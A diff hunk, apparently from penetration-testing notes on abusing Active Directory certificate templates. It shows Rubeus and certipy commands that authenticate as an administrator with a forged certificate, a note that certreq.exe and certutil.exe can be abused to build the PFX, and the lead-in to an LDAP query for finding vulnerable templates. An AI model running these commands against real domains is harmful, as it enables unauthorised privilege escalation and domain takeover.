@@ -56,6 +56,8 @@ Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:passwo
 certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 ```
 
+The Windows binaries "Certreq.exe" & "Certutil.exe" can be abused to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee   
+
 Moreover, the following LDAP query when run against the AD Forest’s configuration schema can be used to **enumerate** **certificate templates** that do **not require approval/signatures**, that have a **Client Authentication or Smart Card Logon EKU**, and have the **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** flag enabled:
 
 ```
